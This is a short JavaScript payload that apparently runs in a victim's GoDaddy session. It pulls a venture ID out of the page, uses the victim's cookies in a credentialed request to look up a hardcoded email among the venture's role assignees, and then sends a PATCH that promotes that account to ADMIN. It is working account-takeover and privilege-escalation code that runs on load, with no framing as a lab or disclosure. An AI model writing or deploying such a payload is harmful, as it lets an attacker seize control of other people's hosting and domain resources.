const EMAIL = "razisaga@gmail.com";

function processAndPromoteUser() {
    try {
        const html = document.documentElement.innerHTML;
        const match = html.match(/ventureId["']?\s*:\s*["']?([^"',}\s]+)/i);
        const resourceId = match ? match[1] : null;

        if (!resourceId) {
            throw new Error("ventureId not found");
        }

        console.log("resourceId:", resourceId);

        const getRequest = new XMLHttpRequest();
        getRequest.open(
            "GET",
            `https://api.godaddy.com/v2/roles/assignees?resourceType=venture&resourceId=${resourceId}`,
            false
        );
        getRequest.withCredentials = true;
        getRequest.send();

        if (getRequest.status !== 200) {
            throw new Error(`Failed to fetch assignees: ${getRequest.statusText}`);
        }

        const responseData = JSON.parse(getRequest.responseText);

        const user = responseData?.roleAssignees?.find(
            u => u.userEmail === EMAIL
        );

        const assigneeId = user?.userId;

        if (!assigneeId) {
            throw new Error("assigneeId not found for given email");
        }

        console.log("assigneeId:", assigneeId);

        // Step 4: Promote role to ADMIN
        const patchRequest = new XMLHttpRequest();
        patchRequest.open("PATCH", "https://api.godaddy.com/v2/roles/assignees", false);
        patchRequest.setRequestHeader("Content-Type", "application/json");
        patchRequest.withCredentials = true;

        const payload = {
            userName: user.userName || "testt",
            defaultRole: "ADMIN",
            assigneeId: assigneeId,
            resourceId: resourceId,
            resourceType: "venture"
        };

        patchRequest.send(JSON.stringify(payload));

        if (patchRequest.status !== 200) {
            throw new Error(`Failed to update role: ${patchRequest.statusText}`);
        }

        console.log("User role updated to ADMIN successfully.");
    } catch (error) {
        console.error("Error:", error.message);
    }
}

processAndPromoteUser();
